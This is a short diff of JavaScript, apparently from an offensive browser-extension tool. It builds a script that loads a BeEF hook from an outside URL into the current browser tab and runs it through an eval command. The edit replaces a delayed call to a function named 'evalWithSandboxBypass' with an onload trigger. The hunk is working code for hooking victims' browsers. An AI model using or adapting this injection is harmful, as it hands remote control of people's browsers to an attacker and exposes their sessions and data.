@@ -626,14 +626,11 @@ $(function() {
 var d=document;\n\
 var s = d.createElement('script');\n\
 s.src = " + JSON.stringify(beef) + "; // BeEF hook here\n\
+s.setAttribute('onload','beef_init();');\n\
 d.body.appendChild(s);\n\
 })();";
         al("BeEF hooking " + beef + " part 1");
         sendCmd('eval', step1, {id: currentTab});
-        setTimeout(function() {
-            al("BeEF hooking " + beef + " part 2");
-            evalWithSandboxBypass("beef_init();", currentTab);
-        }, 10000); // step 2 in 10 seconds
         return false;
     });
 
